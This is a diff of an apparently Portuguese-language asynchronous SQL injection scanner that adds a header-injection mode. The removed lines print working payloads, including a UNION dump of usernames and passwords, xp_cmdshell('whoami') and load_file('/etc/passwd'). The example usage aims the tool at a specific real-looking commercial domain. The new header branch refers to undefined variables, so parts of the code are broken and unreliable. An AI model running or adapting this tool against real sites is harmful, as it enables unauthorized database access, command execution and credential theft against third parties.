@@ -56,19 +56,6 @@ async def sqli_waf_detection(response):
     return True if score >= 10 else False
 
 
-# file -> wordlist
-async def sqli_useragent(file='wordlists/sqli/injection.txt'):
-    with open(file, 'r') as f:
-        lines = f.readlines()
-    
-    headers = {
-        'User-Agent': lines[random.randint(0, len(lines)-1)].strip(),
-        'Referer': lines[random.randint(0, len(lines)-1)].strip(),
-        'X-Forwarded-For': lines[random.randint(0, len(lines)-1)].strip(),
-    }
-    return headers
-
-
 async def response_analyzer(origin, payload, response, continue_):
     score = 0
     details = {}
@@ -149,85 +136,77 @@ async def response_analyzer(origin, payload, response, continue_):
 
     return details, score, html_sample
 
+import random
+import asyncio
 
-async def sqli_query_string(origin, file=None, ua_status=False, headers=None, timeout=10, SSL=True, proxies=None, interval=0, continue_=False, score_sqli=False, try_requests=1):
-    # CONSTANTES
+async def sqli(origin, option='query string', file=None, ua_status=False, headers=None, timeout=10, SSL=True, proxies=None, interval=0, continue_=False, score_sqli=False, try_requests=1):
     name_save_file = 'sqli_test.json'
     scheme = 'https' if SSL else 'http'
+    
+    if file is None:
+        print(f'[#][{commons.time_now()}] Usando payloads padrão')
+        file = 'wordlists/sqli/default_payload.txt'
 
-    default_payload = [
-        "1 OR 1=1",
-        "' OR '1'='1'--",
-        "' UNION SELECT NULL,NULL--",
-        "' UNION SELECT username, password FROM users--",
-        "admin' --",
-        "admin' #",
-        "admin'/*",
-        "' OR 1=1#",
-        "' OR 'x'='x",
-        "1 AND 1=2",
-        "1 UNION ALL SELECT NULL,NULL,NULL--",
-        "1' AND SLEEP(5)--",
-        "1' AND pg_sleep(5)--",
-        "1 WAITFOR DELAY '00:00:05'--",
-        "' OR EXISTS(SELECT * FROM users)--",
-        "' UNION SELECT table_name FROM information_schema.tables--",
-        "' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users'--",
-        "1; EXEC xp_cmdshell('whoami')--",
-        "1; SELECT load_file('/etc/passwd')--",
-        "' UNION SELECT 1,database(),user()--",
-        "admin' AND 1=(SELECT COUNT(*) FROM tablename)--",
-        "' AND ASCII(SUBSTRING((SELECT database()),1,1))>77--",
-        "' OR updatexml(1,concat(0x7e,(SELECT database())),0)--",
-        "' OR extractvalue(1,concat(0x7e,(SELECT user())))--",
-        "1;SELECT+PG_SLEEP(5)",
-        "' AND 1=CAST((SELECT table_name FROM information_schema.tables LIMIT 1) AS INT)--",
-    ]
-    
-    if file == None:
-        print(f'[#][{commons.time_now()}] Implementando o uso de payloads padrao')
-        payloads = default_payload
-    else:
-        status_payload, payloads = await commons.fileReader(file)
-        if not status_payload:
-            print(f'[-][{commons.time_now()}] {payloads}')
-            return False, payloads
-    
-    async def sqli_async(payloads):
+    status_payload, payloads = await commons.fileReader(file)
+    if not status_payload:
+        print(f'[-][{commons.time_now()}] {payloads}')
+        return False, payloads
+
+    async def engine(payload, url, headers=None):
+        await asyncio.sleep(interval)
+        print(f'[+][{commons.time_now()}] Tentando: {url}')
+        
+        status, r = commons.request(url, timeout=timeout, SSL=SSL, headers=headers,
+                                    ua_status=ua_status, redirect=False, proxies=proxies, try_requests=try_requests)
+        
+        if status:
+            details, score, html_sample = await response_analyzer(origin, payload, r, continue_)
+        else:
+            print(f'{" "*3}[>][{commons.time_now()}] Falha ao requisitar: {r}')
+            details, score, html_sample = {}, 0, ''
+        
+        json_obj = jsonlog.ObjectJson.from_data(
+            domain=origin, payload=payload, url=url, ip='', r=r,
+            html_sample=html_sample, details=details
+        )
+        await jsonlog.AsyncLogger(name_save_file).json_write(json_obj)
+
+    if option == 'query string':
         for payload in payloads:
-            # VARIAVEIS
-            score = 0
-            details = {}
-            html_sample = ''
-
             payload = payload.strip()
             url = f'{scheme}://{origin}'.replace('*', payload)
+            await engine(payload, url)
 
-            await asyncio.sleep(interval)
+        return True, f'[#] Payloads concluídos: {file} → {name_save_file}'
 
-            print(f'[+][{commons.time_now()}] Tentando: {url}')
-            status, r = commons.request(url, timeout=timeout, SSL=SSL, headers=headers,
-                                        ua_status=ua_status, redirect=False, proxies=proxies, try_requests=try_requests)
-            
-            if status:
-                details, score, html_sample = await response_analyzer(origin, payload, r, continue_)
+    elif option == 'headers':
+        total_combinations = len(payloads) ** 3
+        used_combinations = set()
 
-            # retorna em caso de erros na requisicao
-            else:
-                print(f'{" "*3}[>][{commons.time_now()}] Falha ao requisitar: {r}')
-            
-            # transforma em json object
-            json_obj_response = jsonlog.ObjectJson.from_data(domain=origin, payload=payload, url=url, ip='', r=r, html_sample=html_sample, details=details)
-            write = await jsonlog.AsyncLogger(name_save_file).json_write(json_obj_response)
+        while len(used_combinations) < total_combinations:
+            current_headers = {
+                'User-Agent': random.choice(payloads).strip(),
+                'Referer': random.choice(payloads).strip(),
+                'X-Forwarded-For': random.choice(payloads).strip(),
+            }
+            combo_key = frozenset(current_headers.items())
+            if combo_key in used_combinations:
+                continue
 
-        return True, f'[#] Wordlist concluido: {file} & Gerado arquivo: {name_save_file}'
-    
-    await sqli_async(payloads) # executa todo o loop e aguarda
+            used_combinations.add(combo_key)
+            url = f'{scheme}://{origin}'  # aqui o payload está no header, não na URL
+            await engine(f'UA:{ua}|Ref:{ref}|IP:{ip}', url, headers=current_headers)
+
+        return True, f'[#] Headers concluídos: {file} → {name_save_file}'
+
+    else:
+        return False, f'[-] Opção inválida: {option}'
+
 
 # Exemplo de uso
 async def main():
     try:
-        status, attk = await sqli_query_string(
+        status, attk = await sqli(
             'www.constinta.com.br/v1-index-php-lojas?srsltid=*',
             continue_=True,
             score_sqli=True,
